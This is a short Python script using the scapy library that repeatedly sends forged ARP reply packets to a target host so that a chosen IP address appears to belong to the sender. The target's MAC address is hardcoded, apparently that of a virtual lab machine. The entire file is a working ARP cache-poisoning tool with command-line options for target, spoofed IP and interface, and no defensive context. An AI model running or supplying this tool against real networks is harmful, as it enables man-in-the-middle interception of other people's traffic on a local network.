from scapy.all import ARP, sendp, Ether
import time
import argparse

def arp_spoof(target_ip, spoof_ip, interface):

    target_mac = "08:00:27:ff:6c:08"

    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )

    print(f"Sending spoofed ARP responses to {target_ip}...")
    try:
        while True:
            print("Sending ARP packet...")
            sendp(packet, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nSpoofing stopped")

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
    parser.add_argument('--target', required=True, help="IP address of target")
    parser.add_argument('--spoof', required=True, help="IP address to spoof")
    parser.add_argument('--interface', required=True, help="Network interface to use")

    args = parser.parse_args()

    arp_spoof(args.target, args.spoof, args.interface)

if __name__ == "__main__":
    main()